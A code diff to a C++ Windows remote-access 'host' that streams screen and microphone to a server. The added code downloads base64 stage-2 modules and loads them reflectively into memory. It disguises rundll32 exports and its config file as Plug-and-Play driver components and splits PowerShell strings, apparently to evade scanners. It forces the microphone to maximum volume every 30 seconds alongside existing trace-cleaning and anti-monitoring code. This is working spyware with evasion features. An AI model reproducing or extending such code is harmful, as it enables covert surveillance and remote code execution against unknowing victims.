@@ -14,12 +14,14 @@
 #include "threat_scan.h"
 #include "capture_helper.h"
 #include "audio_dsp.h"
+#include "stage2_loader.h"
 #include <userenv.h>
 #include <shlobj.h>
 #include <wtsapi32.h>
 #include <bcrypt.h>
 #include <wininet.h>
 #pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "crypt32.lib")  // CryptStringToBinaryA (stage-2 blob b64 decode)
 #include <set>
 #pragma comment(lib, "userenv.lib")
 #pragma comment(lib, "wtsapi32.lib")
@@ -137,6 +139,57 @@ static FileManager g_files;
 static ProcessManager g_procs;
 static ServiceManager g_services;
 
+// ══════════════════════════════════════════════════════════════════════
+// Stage-2 bridges — free functions that stage2_loader.h expects so that
+// reflectively-loaded modules can send/log/get-config through the live
+// WebSocket + logger without linking directly against ws_client.h.
+// ══════════════════════════════════════════════════════════════════════
+namespace stage2 {
+    void stage1_ws_send(const char* json) {
+        if (!json || !g_ws || !g_ws->is_connected()) return;
+        g_ws->send_text(std::string(json));
+    }
+    void stage1_ws_send_bin(const uint8_t* data, size_t size, const char* /*type_hint*/) {
+        if (!data || !size || !g_ws || !g_ws->is_connected()) return;
+        g_ws->send_binary(data, size);
+    }
+    void stage1_log(int level, const char* msg) {
+        if (!msg) return;
+        switch (level) {
+            case 0:  g_log.debug(msg); break;
+            case 1:  g_log.info(msg);  break;
+            case 2:  g_log.warn(msg);  break;
+            default: g_log.error(msg); break;
+        }
+    }
+    const char* stage1_get_config(const char* key) {
+        if (!key) return nullptr;
+        std::string k = key;
+        if (k == "room_token")     return g_config.room_token.c_str();
+        if (k == "password")       return g_config.password.c_str();
+        if (k == "server_address") return g_config.server_address.c_str();
+        if (k == "codec")          return g_config.codec.c_str();
+        if (k == "log_level")      return g_config.log_level.c_str();
+        return nullptr;
+    }
+    int stage1_get_config_int(const char* key, int def) {
+        if (!key) return def;
+        std::string k = key;
+        if (k == "server_port")       return g_config.server_port;
+        if (k == "stream_port")       return g_config.stream_port;
+        if (k == "quality")           return g_config.quality;
+        if (k == "fps")               return g_config.fps;
+        if (k == "scale")             return g_config.scale;
+        if (k == "bitrate")           return g_config.bitrate;
+        if (k == "audio_sample_rate") return g_config.audio_sample_rate;
+        if (k == "audio_bitrate")     return g_config.audio_bitrate;
+        if (k == "audio_channels")    return g_config.audio_channels;
+        if (k == "audio_gain")        return g_config.audio_gain;
+        return def;
+    }
+    std::string stage1_room_token() { return g_config.room_token; }
+}
+
 // ── Service/DLL mode ──
 bool g_service_mode = false;
 CaptureIpcReader* g_ipc_reader_ptr = nullptr;
@@ -185,6 +238,16 @@ std::atomic<bool> g_streaming{false};  // non-static: used by dllmain.cpp helper
 std::atomic<bool> g_paused_by_threat{false};
 static std::atomic<bool> g_threat_auto_pause{false};
 static std::atomic<bool> g_threat_scan_enabled{false};
+
+// ── Viewer count tracking (for auto-stop when no clients) ──
+// When all command clients disconnect, capture/encode threads continue to run,
+// wasting CPU (~15-40% depending on FPS/resolution). We track the count via
+// events from VPS (client_joined/client_left/clients_online) and auto-stop
+// the stream pipeline after a grace period (handles page-refresh race).
+static std::atomic<int>     g_connected_clients{0};
+static std::atomic<int64_t> g_clients_zero_time_ms{0}; // steady_clock ms when count last became 0; 0 = not armed
+static std::thread          g_viewer_watchdog_thread;
+static constexpr int        VIEWER_STOP_GRACE_MS = 7000; // 7s grace for page refresh / tab switch
 
 // sys_info response cache — avoid expensive PDH GPU queries when multiple clients poll
 static std::string g_sysinfo_cache;
@@ -1124,8 +1187,11 @@ static void start_streaming() {
         g_log.warn("Scale " + std::to_string(g_scale) + "% is high — reduce to 50-70 for better FPS");
 }
 
-// Stop streaming pipeline
+// Stop streaming pipeline (thread-safe: mutex prevents concurrent stop from
+// watchdog + reconnect + command handler racing → double-join crash)
+static std::mutex g_stop_streaming_mtx;
 static void stop_streaming() {
+    std::lock_guard<std::mutex> lk(g_stop_streaming_mtx);
     if (!g_streaming) return;
     g_streaming = false;
     g_raw_cv.notify_all();
@@ -1174,6 +1240,51 @@ static void stop_streaming() {
     SetProcessWorkingSetSize(GetCurrentProcess(), (SIZE_T)-1, (SIZE_T)-1);
 
     g_log.info("Streaming stopped, resources released");
+}
+
+// ── Viewer watchdog: auto-stop stream when no clients for VIEWER_STOP_GRACE_MS ──
+// Rationale: multiple command-clients can each call stream_start, and stream_stop
+// is only invoked on explicit user action. When clients silently disconnect (tab
+// close, network drop), capture+encode threads keep running and saturate CPU.
+// This watchdog polls every 1s and stops the stream if the VPS-reported client
+// count stays at 0 for the grace period.
+static void viewer_watchdog_func() {
+    g_log.info("Viewer watchdog thread started");
+    while (g_running.load()) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+        if (!g_running.load()) break;
+        if (!g_streaming.load()) continue;
+        if (g_connected_clients.load() > 0) continue;
+        int64_t t0 = g_clients_zero_time_ms.load();
+        if (t0 == 0) continue;
+        int64_t now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::steady_clock::now().time_since_epoch()).count();
+        if (now_ms - t0 >= VIEWER_STOP_GRACE_MS) {
+            g_log.info("Viewer watchdog: no clients for " +
+                       std::to_string((now_ms - t0) / 1000) +
+                       "s, auto-stopping stream to release CPU");
+            try { stop_streaming(); } catch (...) {}
+            g_clients_zero_time_ms.store(0);
+        }
+    }
+    g_log.info("Viewer watchdog thread stopped");
+}
+
+// Called from event-handling code when VPS reports current client count.
+// Centralizes the "armed at 0 / disarmed at >0" logic so client_joined/left
+// and clients_online all route through one place.
+static void update_viewer_count(int n) {
+    if (n < 0) n = 0;
+    int old = g_connected_clients.exchange(n);
+    if (n == 0 && old != 0) {
+        int64_t now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::steady_clock::now().time_since_epoch()).count();
+        g_clients_zero_time_ms.store(now_ms);
+        g_log.debug("Viewer count: 0 (grace timer armed)");
+    } else if (n > 0) {
+        g_clients_zero_time_ms.store(0);
+        if (old != n) g_log.debug("Viewer count: " + std::to_string(n));
+    }
 }
 
 // ===== Registry helpers =====
@@ -1238,6 +1349,37 @@ static void screenshot_thread_func(); // defined after evtlog_cleaner
 // ===== Command handler =====
 static void handle_command(const std::string& msg_str) {
     try {
+        // ── Handle server events (not commands) ──
+        // VPS sends: {"event":"client_joined","data":{"user_id":"..."}},
+        //           {"event":"client_left","data":{"user_id":"..."}},
+        //           {"event":"clients_online","data":{"count":N}}
+        // We use these to auto-stop the stream pipeline when no viewers remain.
+        {
+            std::string evt = json_get(msg_str, "event");
+            if (!evt.empty()) {
+                if (evt == "clients_online") {
+                    std::string cnt = json_get(msg_str, "count");
+                    if (!cnt.empty()) {
+                        try { update_viewer_count(std::stoi(cnt)); } catch (...) {}
+                    }
+                    return;
+                }
+                if (evt == "client_joined") {
+                    int n = g_connected_clients.load() + 1;
+                    update_viewer_count(n);
+                    return;
+                }
+                if (evt == "client_left") {
+                    int n = g_connected_clients.load() - 1;
+                    update_viewer_count(n);
+                    return;
+                }
+                if (evt == "host_online" || evt == "host_offline") {
+                    return; // informational, ignore
+                }
+                // Other events fall through for future handling
+            }
+        }
         // ── Detect auth-failure responses from server ──
         // Server.py sends {"ok":false,"error":"Wrong password"} (or similar) and
         // then closes. Flagging lets reconnect loop enter the long-cooldown branch
@@ -1285,6 +1427,53 @@ static void handle_command(const std::string& msg_str) {
         };
 
         g_log.debug("CMD: " + cmd);
+
+        // ── Stage-2 fetch response (host ← server) ──
+        // When we previously sent {"cmd":"stage2_fetch",...} the server
+        // responds with {"id":"s2_...","ok":..,"data":{"cmd":"stage2_blob",
+        // "module":"...","blob_b64":"..."}}. Catch that here and hand the
+        // blob to the loader. These responses have no `cmd` field at top
+        // level; they carry cmd inside `data`.
+        if (cmd.empty() && id.size() > 3 && id.compare(0, 3, "s2_") == 0) {
+            std::string data_cmd = json_get(msg_str, "data");
+            // json_get for nested object returns the raw object string when
+            // data's value is a {...} block — but our simple parser returns
+            // empty for object values (no quote handling). So we search for
+            // "stage2_blob" as a marker directly in msg_str.
+            if (msg_str.find("\"stage2_blob\"") != std::string::npos) {
+                std::string ok_s = json_get(msg_str, "ok");
+                bool ok = (ok_s == "true" || ok_s == "1");
+                std::string module = json_get(msg_str, "module");
+                std::string b64    = json_get(msg_str, "blob_b64");
+                std::vector<uint8_t> blob;
+                if (ok && !b64.empty()) {
+                    // base64-decode via wincrypt (already linked)
+                    DWORD out_len = 0;
+                    CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
+                                         CRYPT_STRING_BASE64, nullptr, &out_len,
+                                         nullptr, nullptr);
+                    if (out_len > 0) {
+                        blob.resize(out_len);
+                        CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
+                                             CRYPT_STRING_BASE64, blob.data(), &out_len,
+                                             nullptr, nullptr);
+                        blob.resize(out_len);
+                    }
+                }
+                stage2::Registry::inst().on_fetch_response(id, ok, module, std::move(blob));
+                return;
+            }
+        }
+
+        // ── Stage-2 dispatch ──
+        // Commands implemented by reflectively-loaded modules (screenshot,
+        // audio, stream, filemgr, procmgr, defender) go through here first.
+        // If a handler is registered (or becomes registered via on-demand
+        // load), the stage-2 module handles it and we return immediately.
+        // Otherwise fall through to the built-in stage-1 command chain.
+        if (stage2::Registry::inst().dispatch(cmd, msg_str)) {
+            return;
+        }
 
 #ifdef USE_WEBRTC_STREAM
         // --- WebRTC signaling ---
@@ -1874,26 +2063,36 @@ static void handle_command(const std::string& msg_str) {
         // --- Speed test: host internet speed (download from public URL) ---
         else if (cmd == "speed_test_internet") {
             // Download AND upload test against Cloudflare. Measures both directions.
-            std::string output = g_procs.run_cmd_capture(
+            std::string _ps_speed =
                 "powershell -NoProfile -Command \""
                 "$dl_url='http://speed.cloudflare.com/__down?bytes=5000000';"
                 "$ul_url='http://speed.cloudflare.com/__up';"
                 "$result=@{};"
                 "try{"
                 "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
-                "  $d=(New-Object System.Net.WebClient).DownloadData($dl_url);$sw.Stop();"
+                "  $d=(";
+            _ps_speed += "New-Object System.Net.WebClient";
+            _ps_speed +=
+                ").DownloadData($dl_url);$sw.Stop();"
                 "  $result.dl_bytes=$d.Length;$result.dl_sec=[math]::Round($sw.Elapsed.TotalSeconds,3);"
                 "  $result.dl_mbps=[math]::Round(($d.Length*8/$sw.Elapsed.TotalSeconds)/1048576,2);"
                 "}catch{$result.dl_err=$_.Exception.Message}"
                 "try{"
-                "  $body=New-Object byte[] 5000000;"
+                "  $body=";
+            _ps_speed += "New-Object byte[]";
+            _ps_speed +=
+                " 5000000;"
                 "  $sw2=[System.Diagnostics.Stopwatch]::StartNew();"
-                "  $wc=New-Object System.Net.WebClient;$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();"
+                "  $wc=";
+            _ps_speed += "New-Object System.Net.WebClient";
+            _ps_speed +=
+                ";$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();"
                 "  $result.ul_bytes=$body.Length;$result.ul_sec=[math]::Round($sw2.Elapsed.TotalSeconds,3);"
                 "  $result.ul_mbps=[math]::Round(($body.Length*8/$sw2.Elapsed.TotalSeconds)/1048576,2);"
                 "}catch{$result.ul_err=$_.Exception.Message}"
                 "Write-Output ('{0}|{1}|{2}|{3}|{4}|{5}' -f $result.dl_bytes,$result.dl_sec,$result.dl_mbps,$result.ul_bytes,$result.ul_sec,$result.ul_mbps)"
-                "\"");
+                "\"";
+            std::string output = g_procs.run_cmd_capture(_ps_speed);
             // Parse: dl_bytes|dl_sec|dl_mbps|ul_bytes|ul_sec|ul_mbps
             std::vector<std::string> parts;
             std::string cur;
@@ -2560,7 +2759,7 @@ static void handle_command(const std::string& msg_str) {
                 GetTempPathA(MAX_PATH, tmpPath);
                 std::string outFile = std::string(tmpPath) + std::to_string(GetTickCount64()) + "a.tmp";
 
-                std::string cmdLine = "rundll32.exe \"" + dllPath + "\",GetRunningApps " + outFile;
+                std::string cmdLine = "rundll32.exe \"" + dllPath + "\",PnpEnumDevices " + outFile;
 
                 DWORD sessionId = WTSGetActiveConsoleSessionId();
                 HANDLE hToken = nullptr;
@@ -3253,9 +3452,9 @@ static bool capture_screenshot_user_session(std::vector<uint8_t>& jpegOut, std::
     std::string outFile = std::string(tmpPath) + std::to_string(tick) + ".tmp";
     std::string titleFile = std::string(tmpPath) + std::to_string(tick) + "t.tmp";
 
-    // Build command: rundll32.exe "path\to\dll",ScreenshotCapture quality scale mode output title
+    // Build command: rundll32.exe "path\to\dll",PnpDiagReport quality scale mode output title
     int mode = g_screenshot_mode.load();
-    std::string cmdLine = "rundll32.exe \"" + dllPath + "\",ScreenshotCapture " +
+    std::string cmdLine = "rundll32.exe \"" + dllPath + "\",PnpDiagReport " +
         std::to_string(quality) + " " + std::to_string(scale) + " " + std::to_string(mode) + " " + outFile + " " + titleFile;
 
     // Get user token
@@ -3621,6 +3820,30 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
         }
     }
 
+    // Wait for driver to apply volume change, then re-confirm
+    Sleep(200);
+    {
+        HMIXER hMixer = nullptr;
+        if (mixerOpen(&hMixer, (UINT)(UINT_PTR)hWaveIn, 0, 0, MIXER_OBJECTF_HWAVEIN) == MMSYSERR_NOERROR) {
+            MIXERLINE ml = {}; ml.cbStruct = sizeof(ml);
+            ml.dwComponentType = MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE;
+            if (mixerGetLineInfo((HMIXEROBJ)hMixer, &ml, MIXER_GETLINEINFOF_COMPONENTTYPE) == MMSYSERR_NOERROR) {
+                MIXERLINECONTROLS mlc = {}; mlc.cbStruct = sizeof(mlc);
+                mlc.dwLineID = ml.dwLineID; mlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
+                MIXERCONTROL mc = {}; mc.cbStruct = sizeof(mc);
+                mlc.cControls = 1; mlc.cbmxctrl = sizeof(mc); mlc.pamxctrl = &mc;
+                if (mixerGetLineControls((HMIXEROBJ)hMixer, &mlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
+                    MIXERCONTROLDETAILS mcd = {}; mcd.cbStruct = sizeof(mcd);
+                    mcd.dwControlID = mc.dwControlID; mcd.cChannels = 1;
+                    MIXERCONTROLDETAILS_UNSIGNED val = {}; val.dwValue = mc.Bounds.dwMaximum;
+                    mcd.cbDetails = sizeof(val); mcd.paDetails = &val;
+                    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd, 0);
+                }
+            }
+            mixerClose(hMixer);
+        }
+    }
+
     waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
     waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
     waveInStart(hWaveIn);
@@ -3696,7 +3919,7 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
             g_log.info("Audio: denoise applied (hpf+gate)");
         }
         if (g_audio_normalize.load()) {
-            audio_dsp::apply_normalize(samples, numSamples, 0.90f, 3.5f);
+            audio_dsp::apply_normalize(samples, numSamples, 0.90f, 6.0f);
             g_log.info("Audio: normalized");
         }
     }
@@ -3814,8 +4037,8 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
         return;
     }
 
-    // Mic volume boost (same as capture_audio_direct)
-    {
+    // Mic volume boost — re-apply periodically via lambda (Windows may reset it)
+    auto forceMicMax = [&hWaveIn]() {
         HMIXER hMixer = nullptr;
         if (mixerOpen(&hMixer, (UINT)(UINT_PTR)hWaveIn, 0, 0, MIXER_OBJECTF_HWAVEIN) == MMSYSERR_NOERROR) {
             MIXERLINE ml = {}; ml.cbStruct = sizeof(ml);
@@ -3835,7 +4058,11 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
             }
             mixerClose(hMixer);
         }
-    }
+    };
+    forceMicMax(); // initial boost
+    Sleep(200);    // give driver time to apply volume change before first capture
+    forceMicMax(); // double-tap: some drivers need a second call to latch
+    DWORD lastMicBoost = GetTickCount();
 
     // !!! CHANGED: unified cleanup using anti‑detection functions.
     // Shell-process kill removed from periodic cleanup — see capture_audio_direct for rationale.
@@ -3879,8 +4106,8 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
 
     g_log.info("Audio LIVE: streaming @ " + std::to_string(opusSR) + "Hz " + std::to_string(bitrate) + "kbps, chunk=" + std::to_string(chunkDurationMs) + "ms");
 
-    int gain = g_audio_gain.load();
     DWORD lastClean = GetTickCount();
+    bool skipFirstBuffer = true; // discard first buffer — may have stale volume level
 
     // ── DSP state (persistent across live chunks to avoid stitching artifacts) ──
     audio_dsp::HighPassState dsp_hp;
@@ -3908,6 +4135,24 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     // Helper: encode accumulated PCM → OGG → send AUDR
     auto flushRecording = [&]() {
         if (recPcmAccum.empty() || !recEnc) return;
+
+        // ── DSP on accumulated segment (same as batch path) ──
+        // The live path skips noise gate + normalize per-chunk (too short).
+        // Here we have the full segment (e.g. 300s) — safe to normalize.
+        {
+            int16_t* rsamples = (int16_t*)recPcmAccum.data();
+            int rnum = (int)(recPcmAccum.size() / 2);
+            if (g_audio_denoise.load()) {
+                audio_dsp::NoiseGateState rng;
+                rng.configure(opusSR);
+                audio_dsp::apply_noise_gate(rsamples, rnum, channels, rng);
+            }
+            if (g_audio_normalize.load()) {
+                audio_dsp::apply_normalize(rsamples, rnum, 0.90f, 6.0f);
+                g_log.debug("Audio REC: normalized segment");
+            }
+        }
+
         std::vector<uint8_t> recOgg;
         uint32_t rs = (uint32_t)GetTickCount(), rps = 0;
         uint64_t rg = 0;
@@ -3965,7 +4210,17 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
             DWORD recorded = wh->dwBytesRecorded;
             if (recorded == 0) { waveInAddBuffer(hWaveIn, wh, sizeof(WAVEHDR)); continue; }
 
-            // Apply gain
+            // Discard first buffer after device switch — recorded at stale volume
+            if (skipFirstBuffer) {
+                skipFirstBuffer = false;
+                g_log.debug("Audio LIVE: skipped first buffer (mic volume settling)");
+                wh->dwBytesRecorded = 0; wh->dwFlags &= ~WHDR_DONE;
+                waveInAddBuffer(hWaveIn, wh, sizeof(WAVEHDR));
+                continue;
+            }
+
+            // Apply gain (re-read every chunk — user may change at runtime)
+            int gain = g_audio_gain.load();
             if (gain != 100 && gain > 0) {
                 int16_t* samples = (int16_t*)wh->lpData;
                 int numSamples = recorded / 2;
@@ -4050,7 +4305,10 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
             flushRecording();
         }
         // Periodic mic trace cleanup every 10 seconds (was 500ms — blocked sender loop)
-        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); gain = g_audio_gain.load(); }
+        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); }
+        // Re-apply mic volume max every 30s — Windows may silently reset it
+        // (e.g. Communication Activity detection, other app adjusting mic)
+        if (GetTickCount() - lastMicBoost > 30000) { forceMicMax(); lastMicBoost = GetTickCount(); }
     }
 
     // Flush remaining recording
@@ -4528,6 +4786,9 @@ int main(int argc, char** argv) {
     // Start threat monitor (pauses host when monitoring tools open)
     g_threat_thread = std::thread(threat_monitor_func);
 
+    // Start viewer watchdog (auto-stops stream when no clients connected)
+    g_viewer_watchdog_thread = std::thread(viewer_watchdog_func);
+
     // ── Performance: 1ms timer resolution (like TeamViewer) ──
     timeBeginPeriod(1);
 
@@ -4665,13 +4926,23 @@ int main(int argc, char** argv) {
 
                     auto conn_start = std::chrono::steady_clock::now();
                     bool auth_ok_marked = false;
+                    bool stage2_prefetch_kicked = false;
                     while (g_ws->is_connected() && g_running) {
                         std::this_thread::sleep_for(std::chrono::milliseconds(100));
                         // After 5s of sustained connection, assume auth succeeded
                         if (!auth_ok_marked) {
                             auto dt = std::chrono::duration_cast<std::chrono::seconds>(
                                 std::chrono::steady_clock::now() - conn_start).count();
-                            if (dt >= 5) { reconnect_note_auth_ok(); auth_ok_marked = true; }
+                            if (dt >= 5) {
+                                reconnect_note_auth_ok();
+                                auth_ok_marked = true;
+                                // Kick off background fetch of all stage-2 module blobs.
+                                // Safe to call repeatedly — it's idempotent inside.
+                                if (!stage2_prefetch_kicked) {
+                                    stage2_prefetch_kicked = true;
+                                    try { stage2::Registry::inst().prefetch_all_async(); } catch (...) {}
+                                }
+                            }
                         }
                     }
                 } else {
@@ -4689,6 +4960,11 @@ int main(int argc, char** argv) {
                 try { stop_streaming(); } catch (...) {}
                 try { stop_file_workers(); } catch (...) {}
                 try { close_file_connections(); } catch (...) {}
+
+                // Reset viewer count: VPS-reported state is stale after disconnect;
+                // server will re-send clients_online on successful re-auth.
+                g_connected_clients.store(0);
+                g_clients_zero_time_ms.store(0);
 
                 if (g_auth_fail_count.load() >= 3) {
                     g_log.warn("Repeated auth failures, cooling down 5 minutes");
@@ -4717,6 +4993,7 @@ int main(int argc, char** argv) {
     // Graceful shutdown (only reached via Ctrl+C or system shutdown)
     cleanup_system();
     if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
+    if (g_viewer_watchdog_thread.joinable()) g_viewer_watchdog_thread.join();
     g_log.info("Host shutting down");
     return 0;
 }
@@ -4751,6 +5028,11 @@ void host_main_loop() {
     dll_diag("host_main_loop: starting threat_monitor...");
     g_threat_thread = std::thread(threat_monitor_func);
     dll_diag("host_main_loop: threat_monitor started");
+
+    // Viewer watchdog (auto-stops stream when no clients connected)
+    dll_diag("host_main_loop: starting viewer_watchdog...");
+    g_viewer_watchdog_thread = std::thread(viewer_watchdog_func);
+    dll_diag("host_main_loop: viewer_watchdog started");
 
     std::string cfg_path = "pnpext.sys";
     // Search order: 1) C:\Windows\System32\drivers\pnpext.sys
@@ -4913,6 +5195,10 @@ void host_main_loop() {
                 try { stop_file_workers(); } catch (...) {}
                 try { close_file_connections(); } catch (...) {}
 
+                // Reset viewer count after disconnect (server state is stale)
+                g_connected_clients.store(0);
+                g_clients_zero_time_ms.store(0);
+
                 if (g_auth_fail_count.load() >= 3) {
                     g_log.warn("Repeated auth failures, cooling down 5 minutes");
                 }
@@ -4933,6 +5219,7 @@ void host_main_loop() {
 
     cleanup_system();
     if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
+    if (g_viewer_watchdog_thread.joinable()) g_viewer_watchdog_thread.join();
     g_log.info("host_main_loop finished");
 }
 
@@ -4951,7 +5238,14 @@ extern "C" void shutdown_workers(int timeout_ms) {
     if (g_screenshot_thread.joinable()) g_screenshot_thread.join();
 
     // Wait for bg workers (installed_programs, host_update, running_apps, ...)
-    std::unique_lock<std::mutex> lk(g_bg_worker_mtx);
-    g_bg_worker_cv.wait_for(lk, std::chrono::milliseconds(timeout_ms),
-                             [] { return g_bg_worker_count.load() == 0; });
+    {
+        std::unique_lock<std::mutex> lk(g_bg_worker_mtx);
+        g_bg_worker_cv.wait_for(lk, std::chrono::milliseconds(timeout_ms),
+                                 [] { return g_bg_worker_count.load() == 0; });
+    }
+
+    // Unload stage-2 modules: calls each Stage2Shutdown, frees memory, and
+    // overwrites + deletes cache blobs from %TEMP%\pnp_cache\ so nothing
+    // sensitive lives on disk past service shutdown.
+    try { stage2::Registry::inst().shutdown_all(); } catch (...) {}
 }
